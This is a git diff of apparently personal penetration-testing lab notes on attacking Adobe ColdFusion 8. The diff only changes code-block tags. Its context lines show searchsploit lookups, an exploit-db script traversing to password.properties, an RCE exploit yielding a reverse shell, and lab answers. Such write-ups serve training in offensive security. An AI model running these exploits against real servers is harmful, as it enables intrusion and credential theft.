@@ -1,7 +1,7 @@
 # Attacking ColdFusion
 ## Searchsploit
 
-```sh
+```shellsession
 $ searchsploit adobe coldfusion
 
 ------------------------------------------------------------------------------------------ ---------------------------------
@@ -31,7 +31,7 @@ Shellcodes: No Results
 ## Directory Traversal
 The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like **database connections**, **mail servers**, **LDAP servers**, and other resources that require authentication. 
 
-```sh
+```shellsession
 $ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
 $ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
 
@@ -49,7 +49,7 @@ encrypted=true
 
 ## Unauthenticated RCE
 
-```sh
+```shellsession
 $ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
 ```
 
@@ -67,7 +67,7 @@ if __name__ == '__main__':
 
 Reverse shell:
 
-```sh
+```shellsession
 $ python3 50057.py 
 
 Generating a payload...
@@ -115,7 +115,7 @@ Ncat: Connection from 10.129.247.30:49866.
 ## Questions
 1. What user is ColdFusion running as? **Answer: arctic\tolis**
    - Start a nmap scan, found ColdFusion default port running:
-        ```sh
+        ```shellsession
         $ sudo nmap -Pn -sV -sC -p- -T4 10.129.62.152
         Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-25 23:38 EDT
         Nmap scan report for 10.129.62.152
@@ -129,7 +129,7 @@ Ncat: Connection from 10.129.247.30:49866.
         Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
         ```
    - Navigate to http://10.129.62.152:8500/CFIDE/administrator/, notice target running ColdFusion 8, search for public exploits:
-        ```sh
+        ```shellsession
         $ searchsploit adobe coldfusion
         ---------------------------------------------- ---------------------------------
         Exploit Title                                |  Path
@@ -139,7 +139,7 @@ Ncat: Connection from 10.129.247.30:49866.
         <SNIP>
         ```
    - Copy the exploit and modify it to gain a reverse shell:
-        ```sh
+        ```shellsession
         $ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
         $ cat 50057.py
         <SNIP>
